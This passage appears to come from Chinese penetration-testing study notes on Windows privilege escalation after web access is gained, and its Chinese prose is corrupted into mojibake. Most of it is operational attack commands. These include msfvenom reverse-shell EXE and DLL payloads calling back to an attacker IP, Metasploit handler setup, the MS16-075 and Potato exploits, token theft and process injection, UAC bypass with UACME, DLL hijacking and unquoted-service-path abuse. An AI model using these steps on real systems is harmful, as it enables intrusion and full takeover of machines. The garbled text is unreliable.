è·å–Webæƒé™</p><p>èƒŒæ™¯2ï¼šé€šè¿‡Tomcatå¼±å£ä»¤è¿›å…¥æ§åˆ¶ç•Œé¢é€šè¿‡ä¸Šä¼ è·å–Webæƒé™</p><p>èƒŒæ™¯3ï¼šé€šè¿‡Redisæœªæˆæƒè¿›å…¥ç®¡ç†ç«¯é€šè¿‡SQLæ‰§è¡Œè·å–Webæƒé™</p><h2 id="æƒé™è½¬ç§»-åå°ç®¡ç†-æ•°æ®åº“ç®¡ç†-Web"><a href="#æƒé™è½¬ç§»-åå°ç®¡ç†-æ•°æ®åº“ç®¡ç†-Web" class="headerlink" title="æƒé™è½¬ç§»-åå°ç®¡ç†&amp;æ•°æ®åº“ç®¡ç†&amp;Web"></a>æƒé™è½¬ç§»-åå°ç®¡ç†&amp;æ•°æ®åº“ç®¡ç†&amp;Web</h2><p>Tmall-åå°æƒé™-&gt;Webæƒé™ï¼ˆæå‡ï¼‰</p><p>Tmall-Webæƒé™-&gt;æ•°æ®åº“æƒé™ï¼ˆè½¬ç§»ï¼‰</p><p>Tmall-Webæƒé™-&gt;å¦ä¸€ä¸ªåå°æƒé™ï¼ˆè½¬ç§»ï¼‰</p><p>PhpMyadmin-æ•°æ®ç®¡ç†-&gt;Webæƒé™ï¼ˆæå‡ï¼‰</p><p>PhpMyadmin-Webæƒé™-&gt;å¦ä¸€ä¸ªåå°æƒé™ï¼ˆè½¬ç§»ï¼‰</p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>windowsææƒä¸»è¦è¿˜æ˜¯æº¢å‡ºæ¼æ´</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1722828883099-792fd309-f2d3-47d5-a30a-a011268e2bf2.png"></p><h2 id="Webåˆ°Win-ç³»ç»Ÿææƒ-å®å¡”é¢æ¿-å“¥æ–¯æ‹‰"><a href="#Webåˆ°Win-ç³»ç»Ÿææƒ-å®å¡”é¢æ¿-å“¥æ–¯æ‹‰" class="headerlink" title="Webåˆ°Win-ç³»ç»Ÿææƒ-å®å¡”é¢æ¿-å“¥æ–¯æ‹‰"></a>Webåˆ°Win-ç³»ç»Ÿææƒ-å®å¡”é¢æ¿-å“¥æ–¯æ‹‰</h2><p>Windows 2012(å®å¡”Apache+PHP)-MSF</p><p>å¤ç°æ­å»ºï¼šé€‰æ‹©2012ç³»ç»Ÿåè‡ªè¡Œå®‰è£…å®å¡”</p><p>å“¥æ–¯æ‹‰æ’ä»¶&#x2F;&#x2F;ç¼–ç ç»•è¿‡ã€ç¦ç”¨å‡½æ•°ç»•è¿‡</p><p>Meterpreter</p><p>BypassOpenBaseDir</p><p>BypassDisableFunction</p><h2 id="Webåˆ°Win-ç³»ç»Ÿææƒ-æº¢å‡ºæ¼æ´-MSF-CS"><a href="#Webåˆ°Win-ç³»ç»Ÿææƒ-æº¢å‡ºæ¼æ´-MSF-CS" class="headerlink" title="Webåˆ°Win-ç³»ç»Ÿææƒ-æº¢å‡ºæ¼æ´-MSF&amp;CS"></a>Webåˆ°Win-ç³»ç»Ÿææƒ-æº¢å‡ºæ¼æ´-MSF&amp;CS</h2><p>Windows 2008(IIS+ASP)-MSF</p><p>è‡ªè¡Œæ­å»º+ASP&#x2F;PHP+Windows 2008</p><p>å¤ç°æ­å»ºï¼šé€‰æ‹©2016ç³»ç»Ÿåè‡ªè¡Œå®‰è£…IIS+ASP</p><p>0ã€MSFå®‰è£…ï¼šï¼ˆä¹Ÿå¯ä»¥ç”¨kaliï¼‰</p><p>ç›®å‰çš„msfç‰ˆæœ¬æœ‰bugå¯ä»¥TBä¸Šè´­ä¹°proç‰ˆæœ¬å˜å˜ç¨³</p><p><a href="https://blog.csdn.net/qq_46717339/article/details/122653084">https://blog.csdn.net/qq_46717339/article/details/122653084</a></p><p>1ã€ç”Ÿæˆåå¼¹åé—¨</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe</p><p>LHOSTæ˜¯msfæ”»å‡»æœºé…ç½®</p><p>2ã€æ”»å‡»æœºmsfconsoleé…ç½®ç›‘å¬ä¼šè¯</p><p>msfconsole</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 3333</p><p>exploit</p><p>2.1ã€ç­›é€‰EXPæ¨¡å—</p><p>å…¨è‡ªåŠ¨ï¼šå¿«é€Ÿè¯†åˆ«ç³»ç»Ÿä¸­å¯èƒ½è¢«åˆ©ç”¨çš„æ¼æ´</p><p>use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</p><p>set showdescription true</p><p>3ã€åˆ©ç”¨EXPæº¢å‡ºææƒ</p><p>background</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy</p><p>set session 1</p><p>exploit</p><p>Windows 2016(IIS+ASP.NET)-CS</p><p>å¤ç°æ­å»ºï¼šé€‰æ‹©2016ç³»ç»Ÿåè‡ªè¡Œå®‰è£…IIS+ASP.NET</p><p>0ã€CSå®‰è£…</p><p>chmod +x .&#x2F;teamserver</p><p>chmod +x .&#x2F;TeamServerImage</p><p>.&#x2F;teamserver IP password</p><p>1ã€è¿æ¥CS</p><p>2ã€åˆ›å»ºç›‘å¬å™¨</p><p>3ã€åŠ è½½è„šæœ¬æ’ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724246053021-8b412a41-477f-49fd-adc7-520776ffb99b.png"></p><h2 id="Webåˆ°Win-ç³»ç»Ÿææƒ-äººå·¥æ“ä½œ"><a href="#Webåˆ°Win-ç³»ç»Ÿææƒ-äººå·¥æ“ä½œ" class="headerlink" title="Webåˆ°Win-ç³»ç»Ÿææƒ-äººå·¥æ“ä½œ"></a>Webåˆ°Win-ç³»ç»Ÿææƒ-äººå·¥æ“ä½œ</h2><p>å¦‚æœææƒä¸­æ— æ³•æ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œå¯ä»¥å°è¯•ä¸Šä¼ cmd.exeåˆ°å¯è¯»å†™ç›®å½•å†è°ƒç”¨</p><p>ä¼˜ç‚¹ï¼šè§£å†³å®æ—¶æ›´æ–°ä¸é›†æˆçš„EXP</p><p>ç¼ºç‚¹ï¼šæ“ä½œç¹çï¼Œéœ€è¦å„ç§å¤ç°è°ƒè¯•</p><p>è§£å†³å·¥å…·æˆ–æ’ä»¶æ— æ³•å®æ—¶æ›´æ–°ï¼Œåˆæˆ–è€…é›†æˆè¾ƒå°‘é¢å¯¹å¤æ‚æƒ…å†µä¸‹äººå·¥æ“ä½œæ›´é€‚åˆ</p><p>1ã€ä¿¡æ¯æ”¶é›†</p><p>å‚è€ƒå¸¸è§å‘½ä»¤ï¼ˆè§ä¸Šå›¾ï¼‰</p><p>2ã€è¡¥ä¸ç­›é€‰</p><p><a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a>. (å·²å¤±æ•ˆ)</p><p><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>python wes.py systeminfo.txt â€“color</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311011034-f7cf3728-b7f9-4029-bcc2-fae5883e1d3b.png"></p><p>python wes.py systeminfo.txt â€“color -i â€œElevation of Privilegeâ€ &#x2F;&#x2F;æƒé™æå‡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311164358-6c1f81a9-c839-456c-a50a-c857ce1617d5.png"></p><p>python wes.py systeminfo.txt â€“color -i â€œElevation of Privilegeâ€ -o vuln.csv</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311298993-b6b6f279-7c29-4a54-bed9-ca7925d99555.png"></p><p>3ã€EXPè·å–æ‰§è¡Œ</p><p>KernelHub é’ˆå¯¹å¸¸ç”¨æº¢å‡ºç¼–å·æŒ‡å®šæ‰¾EXP</p><p>Poc-in-Github é’ˆå¯¹å¹´ä»½åŠç¼–å·æŒ‡å®šæ‰¾EXP</p><p>exploitdb é’ˆå¯¹ç±»å‹åŠå…³é”®è¯´æ˜æŒ‡å®šæ‰¾EXP</p><p><a href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311556498-26632a85-a253-4017-820f-932200703e4c.png"></p><p><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311885633-d9faf042-7b89-467c-833c-2b15d6bbc4dd.png"></p><p><a href="https://gitlab.com/exploit-database/exploitdb">https://gitlab.com/exploit-database/exploitdb</a></p><h2 id="Webåˆ°Win-ç³»ç»Ÿææƒ-åœŸè±†å®¶æ—"><a href="#Webåˆ°Win-ç³»ç»Ÿææƒ-åœŸè±†å®¶æ—" class="headerlink" title="Webåˆ°Win-ç³»ç»Ÿææƒ-åœŸè±†å®¶æ—"></a>Webåˆ°Win-ç³»ç»Ÿææƒ-åœŸè±†å®¶æ—</h2><p><a href="https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w">https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w</a></p><p>åœŸè±†(potato)ææƒé€šå¸¸ç”¨åœ¨æˆ‘ä»¬è·å–WEB&#x2F;æ•°æ®åº“æƒé™çš„æ—¶å€™ï¼Œ</p><p>å¯ä»¥å°†ä½æƒé™çš„æœåŠ¡ç”¨æˆ·æå‡ä¸ºâ€œNT AUTHORITY\SYSTEMâ€ç‰¹æƒã€‚</p><p>1ã€Test inï¼šWindows 10&#x2F;11ï¼ˆ1809&#x2F;21H2ï¼‰</p><p>2ã€Test inï¼šWindows Server 2019Datacenter(1809)</p><p>3ã€Test inï¼šWindows Server 2022Datacenter(21H2)</p><p>OKçš„æ˜¯å®éªŒä¸­æˆåŠŸææƒçš„</p><p>SweetPotato OK</p><p>RoguePotato</p><p>BadPotato OK</p><p>EfsPotato OK</p><p>GodPotato OK</p><p>PetitPotato OK</p><p>MultiPotato</p><p>CandyPotato</p><p>RasmanPotato OK</p><p>CoercedPotato</p><p>JuicyPotatoNG</p><p>PrintNotifyPotato OK</p><p>ä¸‹è½½å®Œç›´æ¥ç”¨visual studioæ‰“å¼€è¿è¡Œå°±è¡Œ</p><p>GodPotato</p><p><a href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></p><p>SweetPotato</p><p><a href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a></p><p>RoguePotato</p><p><a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p><p>BadPotato</p><p><a href="https://github.com/BeichenDream/BadPotato">https://github.com/BeichenDream/BadPotato</a></p><p>EfsPotato</p><p><a href="https://github.com/zcgonvh/EfsPotato">https://github.com/zcgonvh/EfsPotato</a></p><p>MultiPotato</p><p><a href="https://github.com/S3cur3Th1sSh1t/MultiPotato">https://github.com/S3cur3Th1sSh1t/MultiPotato</a></p><p>CandyPotato</p><p><a href="https://github.com/klezVirus/CandyPotato">https://github.com/klezVirus/CandyPotato</a></p><p>RasmanPotato</p><p><a href="https://github.com/crisprss/RasmanPotato">https://github.com/crisprss/RasmanPotato</a></p><p>PetitPotato</p><p><a href="https://github.com/wh0amitz/PetitPotato">https://github.com/wh0amitz/PetitPotato</a></p><p>JuicyPotatoNG</p><p><a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a></p><p>PrintNotifyPotato</p><p><a href="https://github.com/BeichenDream/PrintNotifyPotato">https://github.com/BeichenDream/PrintNotifyPotato</a></p><p>CoercedPotato</p><p><a href="https://github.com/Prepouce/CoercedPotato">https://github.com/Prepouce/CoercedPotato</a></p><h2 id="é’“é±¼æˆåŠŸåœºæ™¯"><a href="#é’“é±¼æˆåŠŸåœºæ™¯" class="headerlink" title="é’“é±¼æˆåŠŸåœºæ™¯"></a>é’“é±¼æˆåŠŸåœºæ™¯</h2><p>åº”ç”¨åœºæ™¯ï¼š</p><p>1ã€å¸¸è§„æŸä¸ªæœºå™¨è¢«é’“é±¼åé—¨æ”»å‡»åï¼Œæˆ‘ä»¬éœ€è¦åšæ›´é«˜æƒé™æ“ä½œæˆ–æƒé™ç»´æŒç­‰ã€‚</p><p>2ã€å†…ç½‘åŸŸä¸­æŸä¸ªæœºå™¨è¢«é’“é±¼åé—¨æ”»å‡»åï¼Œæˆ‘ä»¬éœ€è¦å¯¹åç»­å†…ç½‘åŸŸåšå®‰å…¨æµ‹è¯•ã€‚</p><p>æ¯”å¦‚è®¡ç®—æœºç®¡ç†å‘˜ç”¨æˆ·æ‰§è¡Œäº†æœ¨é©¬æ–‡ä»¶ï¼Œä¸Šçº¿åä¸ºadminnistratoræƒé™ï¼Œæ­¤æ—¶æƒ³çœ‹net user &#x2F;åŸŸå</p><p>åŸŸå†…ç”¨æˆ·ï¼Œä½†æ˜¯è®¡ç®—æœºç®¡ç†å‘˜æƒé™ä¸è¡Œï¼Œå› ä¸ºå®ƒå±äºè®¡ç®—æœºæœ¬æœºçš„ç®¡ç†å‘˜ä¸ç®—åŸŸå†…æˆå‘˜ï¼Œæ­¤æ—¶è¦ä¹ˆå‡æƒé™åˆ°systemè·å–è®¡ç®—æœºç³»ç»Ÿæƒé™ï¼Œè¦ä¹ˆé™ä½æƒé™åˆ°åŸŸå†…ç”¨æˆ·</p><p>ä¸»è¦å½“å‰æŠ€æœ¯å…¥å£ç‚¹ï¼š</p><p>-å½“å‰æƒé™ç”±é’“é±¼æ”»å‡»è·å–</p><p>ä¸»è¦å½“å‰æŠ€æœ¯åº”ç”¨ç‚¹ï¼š</p><p>-å½“å‰å—æ§æœºåœ¨å†…ç½‘åŸŸç¯å¢ƒ</p><p>1ã€ææƒsystemä¸å†…ç½‘äº¤äº’</p><p>2ã€é™æƒåˆ°åŸŸç”¨æˆ·ä¸å†…ç½‘äº¤äº’</p><p>net useræŸ¥çœ‹è®¡ç®—æœºç”¨æˆ·</p><p>net user &#x2F;domainname æŸ¥çœ‹åŸŸå†…ç”¨æˆ·</p><p>cså†…æ‰§è¡Œå‘½ä»¤å‰é¢åŠ shell </p><p>shell net user </p><h3 id="æœåŠ¡å¯åŠ¨ï¼ˆææƒï¼‰"><a href="#æœåŠ¡å¯åŠ¨ï¼ˆææƒï¼‰" class="headerlink" title="æœåŠ¡å¯åŠ¨ï¼ˆææƒï¼‰"></a>æœåŠ¡å¯åŠ¨ï¼ˆææƒï¼‰</h3><p>scæ˜¯ç”¨äºä¸æœåŠ¡æ§åˆ¶ç®¡ç†å™¨å’ŒæœåŠ¡è¿›è¡Œé€šä¿¡çš„å‘½ä»¤è¡Œç¨‹åºã€‚</p><p>é€‚ç”¨ç‰ˆæœ¬ï¼šwindows 7ã€10ã€08ã€12ã€16ã€19ã€22ï¼Œæ—©æœŸç”¨atå‘½ä»¤</p><p>1ã€åˆ›å»ºä¸€ä¸ªåå«syscmdçš„æ‰§è¡Œæ–‡ä»¶æœåŠ¡</p><p>sc Create syscmd binPath&#x3D;â€c:\msf.exeâ€ </p><p>2ã€è¿è¡ŒæœåŠ¡</p><p>sc start syscmd</p><p>#è¿œç¨‹æ§åˆ¶ï¼ˆææƒï¼‰</p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p>psexec.exe -accepteula -s -i -d cmd #è°ƒç”¨è¿è¡Œcmd</p><p>#è¿›ç¨‹æ³¨å…¥ï¼ˆé™æƒ&amp;ææƒï¼‰</p><p>ä¸¾ä¾‹ï¼šwinç³»ç»Ÿä¸­ä»»åŠ¡ç®¡ç†å™¨ï¼Œæœ‰ä¸¤ä¸ªè¿›ç¨‹exeï¼Œaè¿›ç¨‹ç”¨æˆ·ä¸ºadministrator,bè¿›ç¨‹ä¸ºsystemï¼ˆæƒé™é«˜ï¼‰ï¼Œaè¿›ç¨‹æ³¨å…¥bè¿›ç¨‹ï¼Œå˜æˆsystemï¼Œææƒï¼›bè¿›ç¨‹æ³¨å…¥aè¿›ç¨‹ï¼Œå˜æˆadministratorï¼Œé™æƒ</p><p><font style="color:#000000;">MSFï¼š<br></font>åˆ©ç”¨å‰é¢è®²çš„æº¢å‡ºæ¼æ´ï¼Œ</p><p><font style="color:#000000;">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe<br></font>ç”Ÿæˆçš„msf.exeåœ¨&#x2F;rootç›®å½•ä¸‹</p><p>åœ¨å¯åŠ¨msfconsoleç›‘å¬ç«¯å£</p><p>æ”»å‡»æœºmsfconsoleé…ç½®ç›‘å¬ä¼šè¯</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 3333</p><p>exploit</p><p>åœ¨ç›‘å¬ç«¯å£æ‹¿åˆ°çš„shell</p><p>ps &#x2F;&#x2F;æŸ¥çœ‹è¿›ç¨‹</p><p>migrate PID &#x2F;&#x2F;è¿ç§»å¯¹åº”PID</p><p>ä»msf.exeå¼€å§‹è¿ç§»åˆ°PID</p><p>æ­¤æ—¶å†getuidå°±è·å–åˆ°è¿ç§»çš„PIDçš„Useræƒé™äº†äº†</p><p>CS:&#x2F;&#x2F;æ™®é€šç”¨æˆ·æ³¨å…¥è¿›ç¨‹å’Œçªƒå–éƒ½æ²¡åŠæ³•æ‰§è¡Œï¼Œè‡³å°‘å¾—administrator</p><p>ps &#x2F;&#x2F;æŸ¥çœ‹è¿›ç¨‹</p><p>inject PID &#x2F;&#x2F;æ³¨å…¥å¯¹åº”PID</p><p>#ä»¤ç‰Œçªƒå–ï¼ˆé™æƒ&amp;ææƒï¼‰</p><p>MSFï¼š</p><p>use incognito</p><p>list_tokens -u</p><p>è·å–åˆ°èƒ½çªƒå–çš„ç”¨æˆ·ï¼Œå…¶ä¸­é‡Œé¢æœ‰NT AUTHORITY\SYSTEM</p><p>impersonate_token â€œNT AUTHORITY\SYSTEMâ€</p><p>ä¹Ÿå¯ä»¥ç›´æ¥è¾“å…¥getsystemå‘½ä»¤ææƒï¼Œmsfä¼šè‡ªåŠ¨å°è¯•å¯ä½¿ç”¨çš„æ–¹å¼ææƒ</p><p>CS:</p><p>ps &#x2F;&#x2F;æŸ¥çœ‹è¿›ç¨‹</p><p>steal_token PID &#x2F;&#x2F;çªƒå–è¿›ç¨‹ä»¤ç‰Œ</p><p>spawnu PID &#x2F;&#x2F;çªƒå–è¿›ç¨‹ä»¤ç‰Œä¸Šçº¿</p><h3 id="Win10-11-BypassUACè‡ªåŠ¨ææƒ-MSF-UACME"><a href="#Win10-11-BypassUACè‡ªåŠ¨ææƒ-MSF-UACME" class="headerlink" title="Win10&amp;11-BypassUACè‡ªåŠ¨ææƒ-MSF&amp;UACME"></a>Win10&amp;11-BypassUACè‡ªåŠ¨ææƒ-MSF&amp;UACME</h3><p>UAC-&gt;User account controller</p><p>åœ¨æŸäº›winç³»ç»Ÿä¸­ï¼Œè¿è¡Œexeéœ€è¦ç‚¹å‡»å¼¹å‡ºçª—å£çš„æ˜¯æˆ–è€…å¦é€‰æ‹©è¿è¡Œæˆ–è€…ä¸å…è®¸è½¯ä»¶</p><p>ç±»ä¼¼ä¸‹é¢è¿™ç§</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724723287835-c789085c-1f46-4e5a-acae-971eb076a0a4.png"></p><p>ç›´æ¥åœ¨cmdçª—å£é‡Œé¢æ‰§è¡Œä¼šæ˜¾ç¤ºæ‹’ç»è®¿é—®</p><p>ä¸ºäº†è¿œç¨‹æ‰§è¡Œç›®æ ‡çš„exeæˆ–è€…batå¯æ‰§è¡Œæ–‡ä»¶éœ€è¦ç»•è¿‡æ­¤å®‰å…¨æœºåˆ¶</p><p>åœ¨ç”¨æˆ·åˆ°ç³»ç»Ÿæƒé™è‡ªåŠ¨ææƒä¸­ä¹Ÿå­¦é€šè¿‡BypassUACå®ç°è‡ªåŠ¨åŒ–ææƒ</p><p>ç»•è¿‡é¡¹ç›®ï¼šMSFå†…ç½®ï¼ŒPowershellæ¸—é€æ¡†æ¶ï¼ŒUACMEé¡¹ç›®(æ¨è)</p><p>å¼€å¯UACå’Œæœªå¼€å¯UACæ—¶,CS&#x2F;MSFé»˜è®¤getsystemææƒå½±å“(è¿›ç¨‹æ³¨å…¥ç­‰)</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx lport&#x3D;xx -f exe -o msf.exe</p><p>1ã€MSFæ¨¡å—ï¼š</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassua</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup</p><p>2ã€UACMEé¡¹ç›®ï¼š</p><p><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p>Akagi64.exe ç¼–å· è°ƒç”¨æ‰§è¡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724721100788-beeafb14-f9a1-4ca7-a1ef-76ca17586089.png"></p><p>å¦‚æœè¿è¡Œæœ‰é—®é¢˜å°è¯•ä¿®æ”¹SDKç‰ˆæœ¬è§£å†³</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724721550529-1d7a65b0-66f8-4bc1-bea0-326390c5661d.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726525834-a177585e-6efc-4bb5-948c-cb08e05647b1.png"></p><p>å¯¹è¿™äº”ä¸ªå…¨éƒ¨ä¿®æ”¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726559654-aede9dff-e5d8-47d3-82f9-b78024b8190e.png"></p><p>ç”Ÿæˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726678655-257bd3c8-5337-4ee5-af81-af355857d890.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726704612-951ea142-10e7-4461-a25e-7e3376691cc0.png"></p><p>åˆ©ç”¨æ–‡ä»¶åœ¨ä¸‹é¢æ–‡ä»¶å¤¹çš„outputæ–‡ä»¶å¤¹ä¸‹</p><p>å–å‡ºæ¥æ‹¿åˆ°è¦ç»•è¿‡UACçš„æœºå™¨ä¸Šï¼ŒAkagi64.exe æ•°å­—ç¼–å· è¦ç»•è¿‡çš„è½¯ä»¶.exe</p><p>egï¼šAkagi64.exe 41 C:\test\msf.exe</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724727739945-5c40f1c3-83d6-4cd3-ac38-036f7ce5a6a3.png"></p><p>å†msfææƒæˆ–è€…å…¶ä»–æ‰§è¡Œç±»ææƒæ—¶å€™å‘½ä»¤è¡Œæ‰§è¡Œæœ‰å¯èƒ½å¡ä½ï¼Œå°±å¯èƒ½æ˜¯UACå¯¼è‡´</p><h3 id="Windows-DLLåŠ«æŒææƒåº”ç”¨é…åˆMSF-FlashFXP"><a href="#Windows-DLLåŠ«æŒææƒåº”ç”¨é…åˆMSF-FlashFXP" class="headerlink" title="Windows-DLLåŠ«æŒææƒåº”ç”¨é…åˆMSF-FlashFXP"></a>Windows-DLLåŠ«æŒææƒåº”ç”¨é…åˆMSF-FlashFXP</h3><p>åŸç†ï¼šWindowsç¨‹åºå¯åŠ¨çš„æ—¶å€™éœ€è¦DLLã€‚å¦‚æœè¿™äº›DLL ä¸å­˜åœ¨ï¼Œåˆ™å¯ä»¥é€šè¿‡åœ¨åº”ç”¨ç¨‹åºè¦æŸ¥æ‰¾çš„ä½ç½®æ”¾ç½®æ¶æ„DLLæ¥ææƒã€‚é€šå¸¸ï¼ŒWindowsåº”ç”¨ç¨‹åºæœ‰å…¶é¢„å®šä¹‰å¥½çš„æœç´¢DLLçš„è·¯å¾„ï¼Œå®ƒä¼šæ ¹æ®ä¸‹é¢çš„é¡ºåºè¿›è¡Œæœç´¢ï¼š</p><p>1ã€åº”ç”¨ç¨‹åºåŠ è½½çš„ç›®å½•</p><p>2ã€C:\Windows\System32</p><p>3ã€C:\Windows\System</p><p>4ã€C:\Windows</p><p>5ã€å½“å‰å·¥ä½œç›®å½•Current Working Directoryï¼ŒCWD</p><p>6ã€åœ¨PATHç¯å¢ƒå˜é‡çš„ç›®å½•ï¼ˆå…ˆç³»ç»Ÿåç”¨æˆ·ï¼‰</p><p>è¿‡ç¨‹ï¼šä¿¡æ¯æ”¶é›†-è¿›ç¨‹è°ƒè¯•-åˆ¶ä½œdllå¹¶ä¸Šä¼ -æ›¿æ¢dll-ç­‰å¾…å¯åŠ¨åº”ç”¨æˆåŠŸ</p><p>æ£€æµ‹ï¼šChkDllHijack ç«ç»’å‰‘</p><p>é¡¹ç›®ï¼š<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></p><p>åˆ©ç”¨ç«ç»’å‰‘è¿›è¡Œè¿›ç¨‹åˆ†æåŠ è½½DLLï¼Œä¸€èˆ¬å¯»ç¨‹åºDLLåˆ©ç”¨ã€‚</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx lport&#x3D;xx -f dll -o xiaodi.dll</p><p>æå‰ä¿¡æ¯æ”¶é›†ç›¸å…³è½¯ä»¶åŠDLLé—®é¢˜ç¨‹åºï¼Œæœ¬åœ°è°ƒè¯•æˆåŠŸåè¦†ç›–DLLå®ç°åˆ©ç”¨</p><h3 id="Windows-ä¸å¸¦å¼•å·æœåŠ¡è·¯å¾„é…åˆMSF-MacroExpert"><a href="#Windows-ä¸å¸¦å¼•å·æœåŠ¡è·¯å¾„é…åˆMSF-MacroExpert" class="headerlink" title="Windows-ä¸å¸¦å¼•å·æœåŠ¡è·¯å¾„é…åˆMSF-MacroExpert"></a>Windows-ä¸å¸¦å¼•å·æœåŠ¡è·¯å¾„é…åˆMSF-MacroExpert</h3><p>å‰æï¼šéœ€è¦ä¸Šä¼ åˆ°æŒ‡å®šç›®å½•çš„æƒé™</p><p>åŸç†ï¼šæœåŠ¡è·¯å¾„é…ç½®ç”±äºç›®å½•ç©ºæ ¼é—®é¢˜ï¼Œå¯ä¸Šä¼ æ–‡ä»¶é…åˆè§£ææ¶æ„è§¦å‘æ‰§è¡Œ</p><p>è·¯å¾„å¸¦ç©ºæ ¼ä¸”æ²¡è¢«åŒå¼•å·é—­åˆ</p><p>è¿‡ç¨‹ï¼šæ£€æµ‹æœåŠ¡æƒé™é…ç½®-åˆ¶ä½œæ–‡ä»¶å¹¶ä¸Šä¼ -æœåŠ¡è·¯å¾„æŒ‡å‘è§£æ-ç­‰å¾…è°ƒç”¨æˆåŠŸ</p><p>æ£€æµ‹å‘½ä»¤ï¼š</p><p>wmic service get name,displayname,pathname,startmode |findstr &#x2F;i â€œAutoâ€ |findstr &#x2F;i &#x2F;v â€œC:\Windows\â€œ |findstr &#x2F;i &#x2F;v â€œâ€â€</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724738357707-0c37fa9a-5cb7-4447-880f-4d552fec6bb7.png"></p><p>ä¸Šä¼ åå¼¹exeï¼Œè®¾ç½®å¥½å¯¹åº”æ‰§è¡Œååï¼Œæ‰§è¡Œsc start â€œMacro Expertâ€</p><p>å°±æ¯”å¦‚æœ‰ä¸€ä¸ªæœåŠ¡çš„å¯åŠ¨æ˜¯C:\program files\xx.exe</p><p>æ­¤æ—¶ä¸Šä¼ C:\program.exeï¼ŒæœåŠ¡å°±ä¼šæ‰¾åˆ°ä»–ï¼ŒæŠŠåé¢ç©ºæ ¼ä¹‹åçš„å½“ä½œå‚æ•°</p><h3 id="Win2012-ä¸å®‰å…¨çš„æœåŠ¡æƒé™é…åˆMSF-NewServices"><a href="#Win2012-ä¸å®‰å…¨çš„æœåŠ¡æƒé™é…åˆMSF-NewServices" class="headerlink" 